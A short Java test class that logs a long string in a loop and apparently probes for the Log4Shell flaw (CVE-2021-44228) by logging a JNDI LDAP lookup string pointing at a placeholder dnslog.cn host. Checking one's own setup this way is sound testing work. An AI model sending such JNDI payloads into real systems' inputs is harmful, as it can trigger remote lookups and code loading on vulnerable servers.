package smagellan.test;

import org.slf4j.LoggerFactory;

public class Log4jRollingTest {
    private static final org.slf4j.Logger logger = LoggerFactory.getLogger(Log4jRollingTest.class);

    public static void main(String[] args) {
        //rollingTest();
        CVE_2021_44228_test();
    }

    private static void CVE_2021_44228_test() {
        logger.info("info: {}", "${jndi:ldap://secretvalue.XXXXX.dnslog.cn}");
    }

    private static void rollingTest() {
        for (int i = 0; i < 1000; ++i) {
            logger.info("looooooooooooooooooooooooooooooooong striiiiiiiiiiiiiiiiiiiiiiiiiiing");
        }
    }
}
